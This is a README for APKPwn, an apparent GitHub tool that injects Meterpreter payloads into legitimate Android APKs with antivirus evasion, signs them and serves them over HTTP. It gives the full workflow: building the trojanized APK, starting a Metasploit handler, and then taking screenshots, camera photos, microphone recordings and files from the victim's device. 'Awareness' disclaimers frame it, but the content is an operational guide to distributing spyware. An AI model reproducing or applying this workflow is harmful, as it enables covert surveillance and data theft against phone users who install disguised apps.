# APKPwn - Android AV Evasion & Payload Injection Tool

APKPwn is a cybersecurity awareness tool designed to generate infected APKs with **Meterpreter** payloads. This tool is intended for educational purposes to demonstrate the risks of poorly managed mobile applications, particularly installing untrusted software.

> **⚠️ IMPORTANT:**
> This project is for educational and awareness purposes only. Any malicious use of this tool is strictly prohibited. **Never use the generated APKs in a real environment or without explicit consent.** The tool is designed for secure testing environments only.

## Features
- Generate Android payloads using `msfvenom`.
- AV evasion for testing on Android apps.
- Integrated APK signing.
- Built-in HTTP server to host and serve malicious APKs.

## Requirements

- Linux system (tested on Ubuntu/Debian).
- Metasploit Framework installed.
- The following dependencies should be present:
  - `apktool`
  - `openjdk-11-jdk`
  - `apksigner`
  - `zipalign`
  
If the dependencies are not installed, the tool will attempt to install them automatically.

## Installation

1. Clone the repository to your machine:

    ```bash
    git clone https://github.com/your-username/APKPwn.git
    cd APKPwn
    ```

2. Install the dependencies:

    The tool will check for the required dependencies and prompt you to install them if necessary.

    ```bash
    python3 apkpwn.py
    ```

3. Run the tool:

    ```bash
    python3 apkpwn.py
    ```

    Follow the on-screen instructions to select the payload, set host and port options, and create the infected APK.

## Usage

### Step 1: Generate the infected APK

Once the tool is launched, you will need to provide the following information:
- **LHOST**: The IP address of your machine (automatically detected by the tool).
- **LPORT**: The port on which Metasploit will listen for connections.
- **Original APK**: Path to a legitimate APK you want to inject the payload into.
- **Output APK**: Name of the malicious APK that will be generated.

### Step 2: Start Metasploit and wait for a connection

The tool will generate a `meterpreter_handler.rc` file to help you start the Metasploit listener:

    msfconsole -r meterpreter_handler.rc

This will launch a handler that will wait for a connection from the infected APK.

### Step 3: Start the HTTP server

Once the malicious APK is generated, the tool will start an HTTP server on your machine to serve the APK:

    ```bash
    http://your-ip:8000/your_malicious_apk.apk
    ```

The goal is to raise awareness of the dangers of APKs downloaded from unofficial sources.

### Step 4: Open a Meterpreter session

When the user installs and runs the infected APK on their device, a Meterpreter session will open. You can then interact with the compromised device:

    ```bash
    meterpreter > sessions -i [Session ID]
    ```

## Awareness Scenario

Here’s a typical awareness scenario for an open Meterpreter session on an Android device.

### 1. **Take a screenshot:**

This demonstrates how an attacker can view the user’s screen:

    ```bash
    meterpreter > screenshot
    ```

### 2. **Retrieve device information:**

To show the amount of information accessible to the attacker:

    ```bash
    meterpreter > sysinfo
    ```

### 3. **Check if the device is rooted:**

Shows how the attacker can check if the device has root permissions:

    ```bash
    meterpreter > check_root
    ```

### 4. **Activate the camera and take a picture:**

A powerful example of how privacy can be compromised:

    ```bash
    meterpreter > webcam_snap
    ```

### 5. **Activate the microphone and record audio:**

Demonstrates how the attacker can record the user’s environment:

    ```bash
    meterpreter > record_mic
    ```

### 6. **Extract files from the device:**

Shows that all the user's data can be exfiltrated:

    ```bash
    meterpreter > ls /sdcard/
    meterpreter > download /sdcard/DCIM/photo.jpg
    ```

## Disclaimer

**APKPwn is strictly for educational and awareness purposes.** Use this tool only in controlled environments with the authorization of all involved parties. Malicious use may result in severe legal consequences.

## Contributions

Contributions are welcome! If you would like to improve the tool, feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
